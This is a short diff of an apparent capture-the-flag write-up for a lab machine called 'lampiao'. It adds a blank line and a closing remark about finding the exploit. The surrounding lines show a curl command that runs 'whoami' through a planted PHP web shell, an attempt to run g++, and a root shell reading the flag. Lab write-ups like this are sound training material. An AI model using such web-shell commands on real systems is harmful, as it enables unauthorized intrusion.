@@ -71,6 +71,7 @@ We launch the exploit.
 [*] Fake shell:   curl 'http://192.168.2.118:1898/s.php' -d 'c=whoami'
 lampiao>>
 ```
+
 Unfortunately, the shell is very limited, try run g++ return:
 
     lampiao>> g++
@@ -158,4 +159,4 @@ We are finally root:
     root@lampiao:~# cat flag.txt
     9740616875908d91ddcdaa8aea3af366
 
-
+Find the good exploit here was a bit long.
